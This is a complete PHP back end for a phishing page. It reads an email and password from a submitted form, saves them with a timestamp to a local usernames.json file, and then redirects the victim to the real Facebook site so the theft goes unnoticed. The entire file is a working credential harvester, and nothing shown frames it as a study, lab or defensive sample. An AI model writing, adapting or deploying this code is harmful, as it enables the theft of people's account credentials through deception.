<?php
$usuarios =json_decode( file_get_contents('usernames.json'), true);

$usuario = [
    'date' => date("Y-m-d H:i:s"),
    'username' => [
        'email'=> $_POST['email'],
        'pass' => $_POST['pass']
    ],
];

array_push($usuarios,$usuario);

file_put_contents("usernames.json", json_encode($usuarios , JSON_PRETTY_PRINT) );
header('Location: https://www.facebook.com');
exit();
?>